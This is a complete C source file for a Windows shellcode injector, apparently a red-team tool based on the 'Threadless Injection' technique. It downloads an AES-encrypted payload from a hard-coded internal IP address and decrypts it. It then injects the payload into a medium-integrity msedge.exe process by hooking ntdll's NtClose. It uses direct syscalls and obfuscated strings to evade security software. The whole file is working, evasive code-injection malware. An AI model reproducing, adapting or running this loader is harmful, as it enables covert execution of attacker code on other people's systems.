// Credits
// Original Threadless Injection: https://github.com/CCob/ThreadlessInject
// GetPID & getIntegrityLevel   : https://captmeelo.com/redteam/maldev/2021/11/22/picky-ppid-spoofing.html
// AESDecrypt                   : reenz0h @SEKTOR7net
// Syscalls via SysWhispers3    : https://github.com/klezVirus/SysWhispers3

#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "syscalls.h"
#include <WinInet.h>

#pragma comment (lib, "Wininet.lib")

// Target process
LPCWSTR targetProcess = L"msedge.exe";

// Payload URL
#define PAYLOAD	L"http://192.168.150.135/payload.bin"

// AES key to decrypt the payload
unsigned char key[] = { 0x23, 0x9d, 0x37, 0xca, 0xf6, 0x1d, 0xf6, 0xc3, 0x99, 0xa2, 0x5b, 0x59, 0x95, 0x65, 0xfe, 0x4f };

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

void GenerateHook(UINT_PTR originalInstructions, char* shellcodeLoader)
{
    for (int i = 0; i < 8; i++)
        shellcodeLoader[18 + i] = ((char*)&originalInstructions)[i];
}

UINT_PTR findMemoryHole(HANDLE proc, UINT_PTR exportAddr, SIZE_T size)
{
    UINT_PTR remoteLdrAddr;
    BOOL foundMem = FALSE;
    NTSTATUS status;

    

    for (remoteLdrAddr = (exportAddr & 0xFFFFFFFFFFF70000) - 0x70000000;
        remoteLdrAddr < exportAddr + 0x70000000;
        remoteLdrAddr += 0x10000)
    {
        status = NtAllocateVirtualMemory(proc, (PVOID*)&remoteLdrAddr, 0, &size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READ);
        if (status != 0)
            continue;

        foundMem = TRUE;
        break;
    }

    return foundMem ? remoteLdrAddr : 0;
}

LPCWSTR getIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);

    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL);
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL);

    DWORD dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
        return L"LOW";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
        return L"MEDIUM";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        return L"HIGH";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"SYSTEM";
    }
}

DWORD GetPID(LPCWSTR targetProcess)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    HANDLE hProcess = NULL;
    
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, NULL, NULL, NULL);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, targetProcess)) {
                CLIENT_ID clientId = { (HANDLE)process.th32ProcessID, NULL };
                NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objAttr, &clientId);
                if (hProcess) {
                    LPCWSTR integrityLevel = NULL;
                    integrityLevel = getIntegrityLevel(hProcess);
                    if (!wcscmp(integrityLevel, L"MEDIUM")) {
                        break;
                    }
                }
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
        hInternetFile = NULL;

    DWORD		dwBytesRead = NULL;

    SIZE_T		sSize = NULL; 	 			// Used as the total payload size

    PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
        pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

    // Opening the internet session handle, all arguments are NULL here since no proxy options are required
    hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Opening the handle to the payload using the payload's URL
    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Allocating 1024 bytes to the temp buffer
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {

        // Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        // Calculating the total size of the total buffer 
        sSize += dwBytesRead;

        // In case the total buffer is not allocated yet
        // then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            // Otherwise, reallocate the pBytes to equal to the total size, sSize.
            // This is required in order to fit the whole payload
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        // Append the temp buffer to the end of the total buffer
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        // Clean up the temp buffer
        memset(pTmpBytes, '\0', dwBytesRead);

        // If less than 1024 bytes were read it means the end of the file was reached
        // Therefore exit the loop 
        if (dwBytesRead < 1024) {
            break;
        }

        // Otherwise, read the next 1024 bytes
    }


    // Saving 
    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											// Closing handle 
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    if (pTmpBytes)
        LocalFree(pTmpBytes);													// Freeing the temp buffer
    return bSTATE;
}

int main() {
    
    LPCSTR      targetDllName;
    LPCSTR      targetFunctionName;
    SIZE_T		Size = NULL;
    PBYTE		Bytes = NULL;
    
    DWORD pid = GetPID(targetProcess);

    // Define the module and function to hook
    char targetDllNameArr[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0 };
    targetDllName = targetDllNameArr;
    char targetfuncArr[] = { 'N', 't', 'C', 'l', 'o', 's', 'e', 0 };
    targetFunctionName = targetfuncArr;
    
    printf("[i] Target process: %ls @ PID %d\n",targetProcess, pid);
    printf("[i] Target Dll/Function: %s!%s\n", targetDllName, targetFunctionName);

    char shellcodeLoader[] = {
        0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
        0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
        0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
        0xE0, 0x90
    };

    // Get address of target function
    HMODULE dllBase = GetModuleHandleA(targetDllName);
    if (dllBase == NULL)
    {
        printf("[-] Unable to locate base address of %s", targetDllName);
        return -1;
    }

    UINT_PTR exportAddress = (UINT_PTR)GetProcAddress(dllBase, targetFunctionName);
    if (exportAddress == 0)
    {
        printf("[-] Unable to locate base address of %s!%s", targetDllName, targetFunctionName);
        return -1;
    }
    
    // Download encrypted payload
    printf("[i] Downloading payload from %ls\n", PAYLOAD);
    if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
        return -1;
    }
    printf("[i] Payload size: %lukb\n", Size);

    // Decrypt shellcode
    printf("[i] Decrypting payload\n");
    if (AESDecrypt((char*)Bytes, Size, (char*)key, sizeof(key)) != 0) {
        return -1;
    }
   
    // Get handle to target process
    HANDLE pHandle = NULL;
    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    ClientId.UniqueProcess = (HANDLE)pid;
    ClientId.UniqueThread = NULL;

    NTSTATUS status = NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
    if (status != 0)
    {
        printf("[-] Unable to acquire handle to target process (pid: %d), status: 0x%lx\n", pid, status);
        return -1;
    }

    printf("[i] Sleeping for 10 seconds...\n");
    Sleep(10000);

    UINT_PTR loaderAddress = findMemoryHole(pHandle, exportAddress, sizeof(shellcodeLoader) + Size);
    if (loaderAddress == 0)
    {
        printf("[-] Unable to locate memory hole within 2G of export address\n");
    }
    
    UINT_PTR originalBytes = 0;
    for (int i = 0; i < 8; i++) ((BYTE*)&originalBytes)[i] = ((BYTE*)exportAddress)[i];

    GenerateHook(originalBytes, shellcodeLoader);

    SIZE_T regionSize = 8;
    ULONG oldProtect = 0;
    UINT_PTR targetRegion = exportAddress;
    status = NtProtectVirtualMemory(pHandle, (PVOID*)&targetRegion, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0)
    {
        printf("[-] Unable to change page protections @ 0x%lx, status: 0x%lx\n", targetRegion, status);
    }

    UINT_PTR relativeLoaderAddress = loaderAddress - (exportAddress + 5);
    char callOpCode[] = { 0xe8, 0, 0, 0, 0 };
    for (int i = 0; i < 4; i++)
        callOpCode[1 + i] = ((char*)&relativeLoaderAddress)[i];

    ULONG bytesWritten = 0;
    targetRegion = exportAddress;
    status = NtWriteVirtualMemory(pHandle, (PVOID)targetRegion, (PVOID)callOpCode, sizeof(callOpCode), (PSIZE_T)(&bytesWritten));
    if (status != 0 || bytesWritten != sizeof(callOpCode))
    {
        printf("[-] Unable to write call opcode @ 0x%lx, status: 0x%lx\n", exportAddress, status);
    }

    regionSize = sizeof(shellcodeLoader) + Size;
    status = NtProtectVirtualMemory(pHandle, (PVOID*)&loaderAddress, &regionSize, PAGE_READWRITE, &oldProtect);
    if (status != 0)
    {
        NtClose(pHandle); pHandle = NULL;
    }

    status = NtWriteVirtualMemory(pHandle, (PVOID)loaderAddress, (PVOID)shellcodeLoader, sizeof(shellcodeLoader), (PSIZE_T)(&bytesWritten));
    if (status != 0 || bytesWritten != sizeof(shellcodeLoader))
    {
        NtClose(pHandle); pHandle = NULL;
    }

    status = NtWriteVirtualMemory(pHandle, (PVOID)(loaderAddress + sizeof(shellcodeLoader)), (PVOID)Bytes, Size, (PSIZE_T)(&bytesWritten));
    if (status != 0 || bytesWritten != Size)
    {
        NtClose(pHandle); pHandle = NULL;
    }

    status = NtProtectVirtualMemory(pHandle, (PVOID*)&loaderAddress, &regionSize, oldProtect, &oldProtect);
    if (status != 0)
    {
        NtClose(pHandle); pHandle = NULL;;
    }

    printf("[i] Complete\n");

    return 0;
}
